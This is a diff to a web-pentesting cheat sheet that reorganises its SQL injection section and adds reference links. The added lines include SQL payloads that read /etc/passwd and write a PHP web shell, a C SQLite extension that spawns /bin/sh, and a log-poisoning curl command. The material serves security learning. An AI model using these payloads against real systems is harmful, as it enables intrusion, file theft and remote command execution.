@@ -299,15 +299,18 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ## SQLi
 
 - https://phptherightway.com/#databases (`mysqli`|| `pdo` connectors)
+- https://pentestmonkey.net/category/cheat-sheet/sql-injection
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
-
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#ByPassingLoginScreens
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#SQLInjectionQuickChecks
 
 ### Blind/Error based/Stacked Queries/Union based/Time based SQLIs
 
-- https://pentestmonkey.net/cheat-sheet/sql-injection/
 - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet     # Database identification
 - https://exploit-notes.hdks.org/exploit/web/sql-injection-cheat-sheet/
 - https://exploit-notes.hdks.org/exploit/web/sql-injection-using-sqlmap/
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#StackingQueries
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#InsertPayloadSample
 
 
 `Protection`:
@@ -343,6 +346,40 @@ curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
 ' union select id, origine, message, 0 from chall #
 ```
 
+#### Read / Write From File
+
+- https://book.jorianwoltjer.com/web/server-side/sql-injection#rce-through-cli
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#BulkInsertFromFile
+
+```sql
+# Read file
+UNION SELECT LOAD_FILE ("etc/passwd")-- 
+
+# Write a file
+UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-- -# /tmp/shell.php?cmd=id
+```
+
+```c
+#include <sqlite3ext.h>
+SQLITE_EXTENSION_INIT1
+
+#include <stdlib.h>
+#include <unistd.h>
+
+int sqlite3_extension_init(sqlite3 *db, char **pzErrMsg, const sqlite3_api_routines *pApi) {
+  SQLITE_EXTENSION_INIT2(pApi);
+
+  execve("/bin/sh", NULL, NULL);  // Spawn an interactive shell
+
+  return SQLITE_OK;
+}
+```
+
+```bash
+gcc -s -g -fPIC -shared extension.c -o extension.so
+#sqlite> select load_extension('./extension');
+```
+
 #### Blind
 
 - https://wiki.zenk-security.com/doku.php?id=failles_web:blind_sql_injection
@@ -353,20 +390,6 @@ admin' and length(password)=8--
 admin' and (select substr(password,1,1)='a')--
 ```
 
-### Read / Write 
-
-```sql
-# Read file
-UNION SELECT LOAD_FILE ("etc/passwd")-- 
-
-# Write a file
-UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
-```
-
-#### RCE - GCC extension
-
-- https://pentestmonkey.net/category/tools/audit
-
 ### Fragmented
 
 - https://www.invicti.com/blog/web-security/fragmented-sql-injection-attacks/
@@ -376,9 +399,11 @@ UNION SELECT "<? system($_REQUEST['cmd']); ?>" INTO OUTFILE "/tmp/shell.php"-
 - https://slcyber.io/assetnote-security-research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/  # Test \'? and ?%00 escapes
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#pdo-prepared-statements
 
-#### Second Order
+### Second Order
+
 
 - https://portswigger.net/kb/issues/00100210_sql-injection-second-order
+- https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet#SecondOrderSQLInjection
 - https://book.hacktricks.wiki/en/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap.html
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#second-order-sql-injection
 
@@ -588,6 +613,8 @@ Header Set-Cookie: mettre le scope de l'attribut SameSite = None
 
 - https://book.hacktricks.wiki/en/pentesting-web/websocket-attacks.html
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Sockets
+
+`Protection`: Use `wss://`
 
 
 ## XSS
